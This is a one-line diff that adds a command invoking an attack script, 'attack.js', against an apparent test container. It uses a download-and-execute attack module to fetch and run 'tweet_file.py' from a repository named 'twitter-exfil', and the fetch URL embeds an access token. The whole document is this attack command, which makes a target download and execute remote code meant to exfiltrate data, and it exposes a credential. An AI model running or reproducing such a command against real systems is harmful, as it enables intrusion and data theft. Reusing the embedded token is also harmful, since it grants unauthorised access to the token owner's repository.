@@ -1,0 +1,1 @@
+node --use_strict attack.js -vv --url "http://csa-test.us-south.containers.appdomain.cloud:32640/" --attack attacks/download-exec.js --set "URL=https://raw.github.ibm.com/isc-csa/twitter-exfil/master/tweet_file.py?token=AABixe34GzA5DDaZCRapzSvejUOlc70wks5cR3y7wA%3D%3D" "ARGS=-a"
